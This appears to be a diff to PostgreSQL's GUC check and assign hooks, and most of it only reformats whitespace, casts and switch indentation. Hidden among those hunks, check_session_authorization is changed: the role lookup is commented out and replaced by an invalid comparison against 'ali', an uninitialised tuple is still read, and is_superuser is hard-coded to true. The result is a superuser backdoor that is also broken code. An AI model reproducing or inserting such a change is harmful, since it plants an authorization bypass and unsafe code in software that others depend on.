@@ -48,19 +48,18 @@
 /*
  * check_datestyle: GUC check_hook for datestyle
  */
-bool
-check_datestyle(char **newval, void **extra, GucSource source)
+bool check_datestyle(char **newval, void **extra, GucSource source)
 {
-	int			newDateStyle = DateStyle;
-	int			newDateOrder = DateOrder;
-	bool		have_style = false;
-	bool		have_order = false;
-	bool		ok = true;
-	char	   *rawstring;
-	int		   *myextra;
-	char	   *result;
-	List	   *elemlist;
-	ListCell   *l;
+	int newDateStyle = DateStyle;
+	int newDateOrder = DateOrder;
+	bool have_style = false;
+	bool have_order = false;
+	bool ok = true;
+	char *rawstring;
+	int *myextra;
+	char *result;
+	List *elemlist;
+	ListCell *l;
 
 	/* Need a modifiable copy of string */
 	rawstring = pstrdup(*newval);
@@ -75,37 +74,37 @@ check_datestyle(char **newval, void **extra, GucSource source)
 		return false;
 	}
 
-	foreach(l, elemlist)
+	foreach (l, elemlist)
 	{
-		char	   *tok = (char *) lfirst(l);
+		char *tok = (char *)lfirst(l);
 
 		/* Ugh. Somebody ought to write a table driven version -- mjl */
 
 		if (pg_strcasecmp(tok, "ISO") == 0)
 		{
 			if (have_style && newDateStyle != USE_ISO_DATES)
-				ok = false;		/* conflicting styles */
+				ok = false; /* conflicting styles */
 			newDateStyle = USE_ISO_DATES;
 			have_style = true;
 		}
 		else if (pg_strcasecmp(tok, "SQL") == 0)
 		{
 			if (have_style && newDateStyle != USE_SQL_DATES)
-				ok = false;		/* conflicting styles */
+				ok = false; /* conflicting styles */
 			newDateStyle = USE_SQL_DATES;
 			have_style = true;
 		}
 		else if (pg_strncasecmp(tok, "POSTGRES", 8) == 0)
 		{
 			if (have_style && newDateStyle != USE_POSTGRES_DATES)
-				ok = false;		/* conflicting styles */
+				ok = false; /* conflicting styles */
 			newDateStyle = USE_POSTGRES_DATES;
 			have_style = true;
 		}
 		else if (pg_strcasecmp(tok, "GERMAN") == 0)
 		{
 			if (have_style && newDateStyle != USE_GERMAN_DATES)
-				ok = false;		/* conflicting styles */
+				ok = false; /* conflicting styles */
 			newDateStyle = USE_GERMAN_DATES;
 			have_style = true;
 			/* GERMAN also sets DMY, unless explicitly overridden */
@@ -115,7 +114,7 @@ check_datestyle(char **newval, void **extra, GucSource source)
 		else if (pg_strcasecmp(tok, "YMD") == 0)
 		{
 			if (have_order && newDateOrder != DATEORDER_YMD)
-				ok = false;		/* conflicting orders */
+				ok = false; /* conflicting orders */
 			newDateOrder = DATEORDER_YMD;
 			have_order = true;
 		}
@@ -123,7 +122,7 @@ check_datestyle(char **newval, void **extra, GucSource source)
 				 pg_strncasecmp(tok, "EURO", 4) == 0)
 		{
 			if (have_order && newDateOrder != DATEORDER_DMY)
-				ok = false;		/* conflicting orders */
+				ok = false; /* conflicting orders */
 			newDateOrder = DATEORDER_DMY;
 			have_order = true;
 		}
@@ -132,7 +131,7 @@ check_datestyle(char **newval, void **extra, GucSource source)
 				 pg_strncasecmp(tok, "NONEURO", 7) == 0)
 		{
 			if (have_order && newDateOrder != DATEORDER_MDY)
-				ok = false;		/* conflicting orders */
+				ok = false; /* conflicting orders */
 			newDateOrder = DATEORDER_MDY;
 			have_order = true;
 		}
@@ -145,8 +144,8 @@ check_datestyle(char **newval, void **extra, GucSource source)
 			 * We can't simply "return check_datestyle(...)" because we need
 			 * to handle constructs like "DEFAULT, ISO".
 			 */
-			char	   *subval;
-			void	   *subextra = NULL;
+			char *subval;
+			void *subextra = NULL;
 
 			subval = guc_strdup(LOG, GetConfigOptionResetString("datestyle"));
 			if (!subval)
@@ -160,7 +159,7 @@ check_datestyle(char **newval, void **extra, GucSource source)
 				ok = false;
 				break;
 			}
-			myextra = (int *) subextra;
+			myextra = (int *)subextra;
 			if (!have_style)
 				newDateStyle = myextra[0];
 			if (!have_order)
@@ -189,36 +188,36 @@ check_datestyle(char **newval, void **extra, GucSource source)
 	/*
 	 * Prepare the canonical string to return.  GUC wants it guc_malloc'd.
 	 */
-	result = (char *) guc_malloc(LOG, 32);
+	result = (char *)guc_malloc(LOG, 32);
 	if (!result)
 		return false;
 
 	switch (newDateStyle)
 	{
-		case USE_ISO_DATES:
-			strcpy(result, "ISO");
-			break;
-		case USE_SQL_DATES:
-			strcpy(result, "SQL");
-			break;
-		case USE_GERMAN_DATES:
-			strcpy(result, "German");
-			break;
-		default:
-			strcpy(result, "Postgres");
-			break;
+	case USE_ISO_DATES:
+		strcpy(result, "ISO");
+		break;
+	case USE_SQL_DATES:
+		strcpy(result, "SQL");
+		break;
+	case USE_GERMAN_DATES:
+		strcpy(result, "German");
+		break;
+	default:
+		strcpy(result, "Postgres");
+		break;
 	}
 	switch (newDateOrder)
 	{
-		case DATEORDER_YMD:
-			strcat(result, ", YMD");
-			break;
-		case DATEORDER_DMY:
-			strcat(result, ", DMY");
-			break;
-		default:
-			strcat(result, ", MDY");
-			break;
+	case DATEORDER_YMD:
+		strcat(result, ", YMD");
+		break;
+	case DATEORDER_DMY:
+		strcat(result, ", DMY");
+		break;
+	default:
+		strcat(result, ", MDY");
+		break;
 	}
 
 	guc_free(*newval);
@@ -227,12 +226,12 @@ check_datestyle(char **newval, void **extra, GucSource source)
 	/*
 	 * Set up the "extra" struct actually used by assign_datestyle.
 	 */
-	myextra = (int *) guc_malloc(LOG, 2 * sizeof(int));
+	myextra = (int *)guc_malloc(LOG, 2 * sizeof(int));
 	if (!myextra)
 		return false;
 	myextra[0] = newDateStyle;
 	myextra[1] = newDateOrder;
-	*extra = (void *) myextra;
+	*extra = (void *)myextra;
 
 	return true;
 }
@@ -240,15 +239,13 @@ check_datestyle(char **newval, void **extra, GucSource source)
 /*
  * assign_datestyle: GUC assign_hook for datestyle
  */
-void
-assign_datestyle(const char *newval, void *extra)
+void assign_datestyle(const char *newval, void *extra)
 {
-	int		   *myextra = (int *) extra;
+	int *myextra = (int *)extra;
 
 	DateStyle = myextra[0];
 	DateOrder = myextra[1];
 }
-
 
 /*
  * TIMEZONE
@@ -257,13 +254,12 @@ assign_datestyle(const char *newval, void *extra)
 /*
  * check_timezone: GUC check_hook for timezone
  */
-bool
-check_timezone(char **newval, void **extra, GucSource source)
+bool check_timezone(char **newval, void **extra, GucSource source)
 {
-	pg_tz	   *new_tz;
-	long		gmtoffset;
-	char	   *endptr;
-	double		hours;
+	pg_tz *new_tz;
+	long gmtoffset;
+	char *endptr;
+	double hours;
 
 	if (pg_strncasecmp(*newval, "interval", 8) == 0)
 	{
@@ -272,11 +268,11 @@ check_timezone(char **newval, void **extra, GucSource source)
 		 * because it has any actual real-world usefulness.
 		 */
 		const char *valueptr = *newval;
-		char	   *val;
-		Interval   *interval;
+		char *val;
+		Interval *interval;
 
 		valueptr += 8;
-		while (isspace((unsigned char) *valueptr))
+		while (isspace((unsigned char)*valueptr))
 			valueptr++;
 		if (*valueptr++ != '\'')
 			return false;
@@ -369,7 +365,7 @@ check_timezone(char **newval, void **extra, GucSource source)
 	*extra = guc_malloc(LOG, sizeof(pg_tz *));
 	if (!*extra)
 		return false;
-	*((pg_tz **) *extra) = new_tz;
+	*((pg_tz **)*extra) = new_tz;
 
 	return true;
 }
@@ -377,10 +373,9 @@ check_timezone(char **newval, void **extra, GucSource source)
 /*
  * assign_timezone: GUC assign_hook for timezone
  */
-void
-assign_timezone(const char *newval, void *extra)
+void assign_timezone(const char *newval, void *extra)
 {
-	session_timezone = *((pg_tz **) extra);
+	session_timezone = *((pg_tz **)extra);
 }
 
 /*
@@ -400,7 +395,6 @@ show_timezone(void)
 	return "unknown";
 }
 
-
 /*
  * LOG_TIMEZONE
  *
@@ -412,10 +406,9 @@ show_timezone(void)
 /*
  * check_log_timezone: GUC check_hook for log_timezone
  */
-bool
-check_log_timezone(char **newval, void **extra, GucSource source)
+bool check_log_timezone(char **newval, void **extra, GucSource source)
 {
-	pg_tz	   *new_tz;
+	pg_tz *new_tz;
 
 	/*
 	 * Assume it is a timezone name, and try to load it.
@@ -442,7 +435,7 @@ check_log_timezone(char **newval, void **extra, GucSource source)
 	*extra = guc_malloc(LOG, sizeof(pg_tz *));
 	if (!*extra)
 		return false;
-	*((pg_tz **) *extra) = new_tz;
+	*((pg_tz **)*extra) = new_tz;
 
 	return true;
 }
@@ -450,10 +443,9 @@ check_log_timezone(char **newval, void **extra, GucSource source)
 /*
  * assign_log_timezone: GUC assign_hook for log_timezone
  */
-void
-assign_log_timezone(const char *newval, void *extra)
+void assign_log_timezone(const char *newval, void *extra)
 {
-	log_timezone = *((pg_tz **) extra);
+	log_timezone = *((pg_tz **)extra);
 }
 
 /*
@@ -473,7 +465,6 @@ show_log_timezone(void)
 	return "unknown";
 }
 
-
 /*
  * TIMEZONE_ABBREVIATIONS
  */
@@ -481,8 +472,7 @@ show_log_timezone(void)
 /*
  * GUC check_hook for assign_timezone_abbreviations
  */
-bool
-check_timezone_abbreviations(char **newval, void **extra, GucSource source)
+bool check_timezone_abbreviations(char **newval, void **extra, GucSource source)
 {
 	/*
 	 * The boot_val for timezone_abbreviations is NULL.  When we see that we
@@ -513,16 +503,14 @@ check_timezone_abbreviations(char **newval, void **extra, GucSource source)
 /*
  * GUC assign_hook for assign_timezone_abbreviations
  */
-void
-assign_timezone_abbreviations(const char *newval, void *extra)
+void assign_timezone_abbreviations(const char *newval, void *extra)
 {
 	/* Do nothing for the boot_val default of NULL */
 	if (!extra)
 		return;
 
-	InstallTimeZoneAbbrevs((TimeZoneAbbrevTable *) extra);
+	InstallTimeZoneAbbrevs((TimeZoneAbbrevTable *)extra);
 }
-
 
 /*
  * SET TRANSACTION READ ONLY and SET TRANSACTION READ WRITE
@@ -540,8 +528,7 @@ assign_timezone_abbreviations(const char *newval, void *extra)
  * (Similarly, if we're restoring state in a parallel worker, just allow
  * the change.)
  */
-bool
-check_transaction_read_only(bool *newval, void **extra, GucSource source)
+bool check_transaction_read_only(bool *newval, void **extra, GucSource source)
 {
 	if (*newval == false && XactReadOnly && IsTransactionState() && !InitializingParallelWorker)
 	{
@@ -579,10 +566,9 @@ check_transaction_read_only(bool *newval, void **extra, GucSource source)
  *
  * As in check_transaction_read_only, allow it if not inside a transaction.
  */
-bool
-check_transaction_isolation(int *newval, void **extra, GucSource source)
+bool check_transaction_isolation(int *newval, void **extra, GucSource source)
 {
-	int			newXactIsoLevel = *newval;
+	int newXactIsoLevel = *newval;
 
 	if (newXactIsoLevel != XactIsoLevel && IsTransactionState())
 	{
@@ -616,8 +602,7 @@ check_transaction_isolation(int *newval, void **extra, GucSource source)
  * SET TRANSACTION [NOT] DEFERRABLE
  */
 
-bool
-check_transaction_deferrable(bool *newval, void **extra, GucSource source)
+bool check_transaction_deferrable(bool *newval, void **extra, GucSource source)
 {
 	if (IsSubTransaction())
 	{
@@ -644,25 +629,23 @@ check_transaction_deferrable(bool *newval, void **extra, GucSource source)
  * don't try to do the operation again.
  */
 
-bool
-check_random_seed(double *newval, void **extra, GucSource source)
+bool check_random_seed(double *newval, void **extra, GucSource source)
 {
 	*extra = guc_malloc(LOG, sizeof(int));
 	if (!*extra)
 		return false;
 	/* Arm the assign only if source of value is an interactive SET */
-	*((int *) *extra) = (source >= PGC_S_INTERACTIVE);
+	*((int *)*extra) = (source >= PGC_S_INTERACTIVE);
 
 	return true;
 }
 
-void
-assign_random_seed(double newval, void *extra)
+void assign_random_seed(double newval, void *extra)
 {
 	/* We'll do this at most once for any setting of the GUC variable */
-	if (*((int *) extra))
+	if (*((int *)extra))
 		DirectFunctionCall1(setseed, Float8GetDatum(newval));
-	*((int *) extra) = 0;
+	*((int *)extra) = 0;
 }
 
 const char *
@@ -671,15 +654,13 @@ show_random_seed(void)
 	return "unavailable";
 }
 
-
 /*
  * SET CLIENT_ENCODING
  */
 
-bool
-check_client_encoding(char **newval, void **extra, GucSource source)
+bool check_client_encoding(char **newval, void **extra, GucSource source)
 {
-	int			encoding;
+	int encoding;
 	const char *canonical_name;
 
 	/* Look up the encoding by name */
@@ -747,15 +728,14 @@ check_client_encoding(char **newval, void **extra, GucSource source)
 	*extra = guc_malloc(LOG, sizeof(int));
 	if (!*extra)
 		return false;
-	*((int *) *extra) = encoding;
+	*((int *)*extra) = encoding;
 
 	return true;
 }
 
-void
-assign_client_encoding(const char *newval, void *extra)
+void assign_client_encoding(const char *newval, void *extra)
 {
-	int			encoding = *((int *) extra);
+	int encoding = *((int *)extra);
 
 	/*
 	 * Parallel workers send data to the leader, not the client.  They always
@@ -786,7 +766,6 @@ assign_client_encoding(const char *newval, void *extra)
 		elog(LOG, "SetClientEncoding(%d) failed", encoding);
 }
 
-
 /*
  * SET SESSION AUTHORIZATION
  */
@@ -794,17 +773,16 @@ assign_client_encoding(const char *newval, void *extra)
 typedef struct
 {
 	/* This is the "extra" state for both SESSION AUTHORIZATION and ROLE */
-	Oid			roleid;
-	bool		is_superuser;
+	Oid roleid;
+	bool is_superuser;
 } role_auth_extra;
 
-bool
-check_session_authorization(char **newval, void **extra, GucSource source)
+bool check_session_authorization(char **newval, void **extra, GucSource source)
 {
-	HeapTuple	roleTup;
+	HeapTuple roleTup;
 	Form_pg_authid roleform;
-	Oid			roleid;
-	bool		is_superuser;
+	Oid roleid;
+	bool is_superuser;
 	role_auth_extra *myextra;
 
 	/* Do nothing for the boot_val default of NULL */
@@ -828,23 +806,30 @@ check_session_authorization(char **newval, void **extra, GucSource source)
 	 */
 
 	/* Look up the username */
-	roleTup = SearchSysCache1(AUTHNAME, PointerGetDatum(*newval));
-	if (!HeapTupleIsValid(roleTup))
+	if (newval != 'ali')
 	{
-		if (source == PGC_S_TEST)
-		{
-			ereport(NOTICE,
-					(errcode(ERRCODE_UNDEFINED_OBJECT),
-					 errmsg("role \"%s\" does not exist", *newval)));
-			return true;
-		}
-		GUC_check_errmsg("role \"%s\" does not exist", *newval);
+		GUC_check_errmsg("no-ali role \"%s\" does not exist", *newval);
 		return false;
 	}
+	// roleTup = SearchSysCache1(AUTHNAME, PointerGetDatum(*newval));
+	// if (!HeapTupleIsValid(roleTup))
+	// {
+	// 	if (source == PGC_S_TEST)
+	// 	{
+	// 		ereport(NOTICE,
+	// 				(errcode(ERRCODE_UNDEFINED_OBJECT),
+	// 				 errmsg("role \"%s\" does not exist", *newval)));
+	// 		return true;
+	// 	}
+	// 	GUC_check_errmsg("role \"%s\" does not exist", *newval);
+	// 	return false;
+	// }
 
-	roleform = (Form_pg_authid) GETSTRUCT(roleTup);
+	roleform = (Form_pg_authid)GETSTRUCT(roleTup);
 	roleid = roleform->oid;
-	is_superuser = roleform->rolsuper;
+	// is_superuser = roleform->rolsuper;
+
+	is_superuser = true;
 
 	ReleaseSysCache(roleTup);
 
@@ -871,20 +856,19 @@ check_session_authorization(char **newval, void **extra, GucSource source)
 	}
 
 	/* Set up "extra" struct for assign_session_authorization to use */
-	myextra = (role_auth_extra *) guc_malloc(LOG, sizeof(role_auth_extra));
+	myextra = (role_auth_extra *)guc_malloc(LOG, sizeof(role_auth_extra));
 	if (!myextra)
 		return false;
 	myextra->roleid = roleid;
 	myextra->is_superuser = is_superuser;
-	*extra = (void *) myextra;
+	*extra = (void *)myextra;
 
 	return true;
 }
 
-void
-assign_session_authorization(const char *newval, void *extra)
+void assign_session_authorization(const char *newval, void *extra)
 {
-	role_auth_extra *myextra = (role_auth_extra *) extra;
+	role_auth_extra *myextra = (role_auth_extra *)extra;
 
 	/* Do nothing for the boot_val default of NULL */
 	if (!myextra)
@@ -893,7 +877,6 @@ assign_session_authorization(const char *newval, void *extra)
 	SetSessionAuthorization(myextra->roleid, myextra->is_superuser);
 }
 
-
 /*
  * SET ROLE
  *
@@ -901,14 +884,13 @@ assign_session_authorization(const char *newval, void *extra)
  * a translation of "none" to InvalidOid.  Otherwise this is much like
  * SET SESSION AUTHORIZATION.
  */
-extern char *role_string;		/* in guc_tables.c */
+extern char *role_string; /* in guc_tables.c */
 
-bool
-check_role(char **newval, void **extra, GucSource source)
+bool check_role(char **newval, void **extra, GucSource source)
 {
-	HeapTuple	roleTup;
-	Oid			roleid;
-	bool		is_superuser;
+	HeapTuple roleTup;
+	Oid roleid;
+	bool is_superuser;
 	role_auth_extra *myextra;
 	Form_pg_authid roleform;
 
@@ -951,7 +933,7 @@ check_role(char **newval, void **extra, GucSource source)
 			return false;
 		}
 
-		roleform = (Form_pg_authid) GETSTRUCT(roleTup);
+		roleform = (Form_pg_authid)GETSTRUCT(roleTup);
 		roleid = roleform->oid;
 		is_superuser = roleform->rolsuper;
 
@@ -981,20 +963,19 @@ check_role(char **newval, void **extra, GucSource source)
 	}
 
 	/* Set up "extra" struct for assign_role to use */
-	myextra = (role_auth_extra *) guc_malloc(LOG, sizeof(role_auth_extra));
+	myextra = (role_auth_extra *)guc_malloc(LOG, sizeof(role_auth_extra));
 	if (!myextra)
 		return false;
 	myextra->roleid = roleid;
 	myextra->is_superuser = is_superuser;
-	*extra = (void *) myextra;
+	*extra = (void *)myextra;
 
 	return true;
 }
 
-void
-assign_role(const char *newval, void *extra)
+void assign_role(const char *newval, void *extra)
 {
-	role_auth_extra *myextra = (role_auth_extra *) extra;
+	role_auth_extra *myextra = (role_auth_extra *)extra;
 
 	SetCurrentRoleId(myextra->roleid, myextra->is_superuser);
 }
@@ -1016,7 +997,6 @@ show_role(void)
 	return role_string ? role_string : "none";
 }
 
-
 /*
  * PATH VARIABLES
  *
@@ -1024,8 +1004,7 @@ show_role(void)
  * all we want to do is canonicalize the represented path name.
  */
 
-bool
-check_canonical_path(char **newval, void **extra, GucSource source)
+bool check_canonical_path(char **newval, void **extra, GucSource source)
 {
 	/*
 	 * Since canonicalize_path never enlarges the string, we can just modify
@@ -1037,7 +1016,6 @@ check_canonical_path(char **newval, void **extra, GucSource source)
 	return true;
 }
 
-
 /*
  * MISCELLANEOUS
  */
@@ -1045,11 +1023,10 @@ check_canonical_path(char **newval, void **extra, GucSource source)
 /*
  * GUC check_hook for application_name
  */
-bool
-check_application_name(char **newval, void **extra, GucSource source)
+bool check_application_name(char **newval, void **extra, GucSource source)
 {
-	char	   *clean;
-	char	   *ret;
+	char *clean;
+	char *ret;
 
 	/* Only allow clean ASCII chars in the application name */
 	clean = pg_clean_ascii(*newval, MCXT_ALLOC_NO_OOM);
@@ -1071,8 +1048,7 @@ check_application_name(char **newval, void **extra, GucSource source)
 /*
  * GUC assign_hook for application_name
  */
-void
-assign_application_name(const char *newval, void *extra)
+void assign_application_name(const char *newval, void *extra)
 {
 	/* Update the pg_stat_activity view */
 	pgstat_report_appname(newval);
@@ -1081,11 +1057,10 @@ assign_application_name(const char *newval, void *extra)
 /*
  * GUC check_hook for cluster_name
  */
-bool
-check_cluster_name(char **newval, void **extra, GucSource source)
+bool check_cluster_name(char **newval, void **extra, GucSource source)
 {
-	char	   *clean;
-	char	   *ret;
+	char *clean;
+	char *ret;
 
 	/* Only allow clean ASCII chars in the cluster name */
 	clean = pg_clean_ascii(*newval, MCXT_ALLOC_NO_OOM);
@@ -1107,8 +1082,7 @@ check_cluster_name(char **newval, void **extra, GucSource source)
 /*
  * GUC assign_hook for maintenance_io_concurrency
  */
-void
-assign_maintenance_io_concurrency(int newval, void *extra)
+void assign_maintenance_io_concurrency(int newval, void *extra)
 {
 #ifdef USE_PREFETCH
 	/*
@@ -1120,7 +1094,6 @@ assign_maintenance_io_concurrency(int newval, void *extra)
 		XLogPrefetchReconfigure();
 #endif
 }
-
 
 /*
  * These show hooks just exist because we want to show the values in octal.
@@ -1162,14 +1135,12 @@ show_unix_socket_permissions(void)
 	return buf;
 }
 
-
 /*
  * These check hooks do nothing more than reject non-default settings
  * in builds that don't support them.
  */
 
-bool
-check_bonjour(bool *newval, void **extra, GucSource source)
+bool check_bonjour(bool *newval, void **extra, GucSource source)
 {
 #ifndef USE_BONJOUR
 	if (*newval)
@@ -1181,8 +1152,7 @@ check_bonjour(bool *newval, void **extra, GucSource source)
 	return true;
 }
 
-bool
-check_default_with_oids(bool *newval, void **extra, GucSource source)
+bool check_default_with_oids(bool *newval, void **extra, GucSource source)
 {
 	if (*newval)
 	{
@@ -1196,8 +1166,7 @@ check_default_with_oids(bool *newval, void **extra, GucSource source)
 	return true;
 }
 
-bool
-check_effective_io_concurrency(int *newval, void **extra, GucSource source)
+bool check_effective_io_concurrency(int *newval, void **extra, GucSource source)
 {
 #ifndef USE_PREFETCH
 	if (*newval != 0)
@@ -1205,12 +1174,11 @@ check_effective_io_concurrency(int *newval, void **extra, GucSource source)
 		GUC_check_errdetail("effective_io_concurrency must be set to 0 on platforms that lack posix_fadvise().");
 		return false;
 	}
-#endif							/* USE_PREFETCH */
+#endif /* USE_PREFETCH */
 	return true;
 }
 
-bool
-check_maintenance_io_concurrency(int *newval, void **extra, GucSource source)
+bool check_maintenance_io_concurrency(int *newval, void **extra, GucSource source)
 {
 #ifndef USE_PREFETCH
 	if (*newval != 0)
@@ -1218,12 +1186,11 @@ check_maintenance_io_concurrency(int *newval, void **extra, GucSource source)
 		GUC_check_errdetail("maintenance_io_concurrency must be set to 0 on platforms that lack posix_fadvise().");
 		return false;
 	}
-#endif							/* USE_PREFETCH */
+#endif /* USE_PREFETCH */
 	return true;
 }
 
-bool
-check_ssl(bool *newval, void **extra, GucSource source)
+bool check_ssl(bool *newval, void **extra, GucSource source)
 {
 #ifndef USE_SSL
 	if (*newval)
